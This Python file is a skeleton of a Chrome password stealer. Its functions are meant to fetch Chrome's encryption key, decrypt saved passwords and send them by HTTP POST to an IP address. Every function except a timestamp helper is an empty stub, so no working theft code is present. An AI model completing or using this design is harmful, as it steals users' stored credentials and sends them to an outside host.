"""
Author: Aleksa Zatezalo
Date: May 2025
Description: Extracts Chrome Passwords
"""

import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import requests


# Password fetching functions
def chrome_date_and_time(chrome_data):
    """
    Returns date and time from google chrome datafile.
    """

    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

def fetching_encryption_key():
    """
    Gets the chrome encryption key.
    """

    pass

def password_decryption(passord, encryption_key):
    """
    Decrypts a password using the chrome decryption key.
    """

    pass

def fetch_passwords():
    """
    Fetches passwords from chrome.
    """

    pass


# Exfiltrate password functionality
def send_passwords(ip, data):
    """
    Sends passwords to IP address via HTTP post request.
    """

    pass

def main():
    pass

if __name__ == "__main__":
    main()